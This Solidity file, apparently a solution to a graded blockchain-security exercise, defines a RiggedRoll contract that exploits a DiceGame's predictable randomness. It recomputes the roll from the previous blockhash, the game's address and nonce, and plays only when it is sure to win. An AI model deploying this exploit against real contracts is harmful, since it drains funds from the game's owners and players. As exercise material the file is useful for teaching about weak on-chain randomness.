pragma solidity >=0.8.0 <0.9.0; //Do not change the solidity version as it negativly impacts submission grading
//SPDX-License-Identifier: MIT

import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

interface IRiggedRoll {
	receive() external payable;

	function withdraw(address payable to, uint256 amount) external;

	function riggedRoll() external payable;
}

contract RiggedRoll is IRiggedRoll, Ownable {
	DiceGame public diceGame;

	constructor(address payable diceGameAddress) {
		diceGame = DiceGame(diceGameAddress);
	}

	// +---------------------------------------------------+
	// |                     EXTERNALS                     |
	// +---------------------------------------------------+

	// enable the contract to receive incoming Ether
	receive() external payable {}

	// transfer Ether from the rigged contract to the owner
	function withdraw(
		address payable to,
		uint256 amount
	) external override onlyOwner {
		to.transfer(amount);
	}

	// only initiate a roll when it guarantees a win.
	function riggedRoll() external payable override {
		uint256 cost = 0.002 ether;
		require(address(this).balance >= cost, "Insufficient balance to play");
		require(canWin(), "You can't win this roll");
		diceGame.rollTheDice{ value: cost }();
	}

	// +---------------------------------------------------+
	// |                     INTERNALS                     |
	// +---------------------------------------------------+

	// check if the roll will be a win
	function canWin() private view returns (bool) {
		return predictRoll() <= 5;
	}

	// predict the randomness in the DiceGame contract
	function predictRoll() private view returns (uint256) {
		bytes32 prevHash = blockhash(block.number - 1);
		bytes32 hash = keccak256(
			abi.encodePacked(prevHash, address(diceGame), diceGame.nonce())
		);
		uint256 roll = uint256(hash) % 16;
		return roll;
	}
}
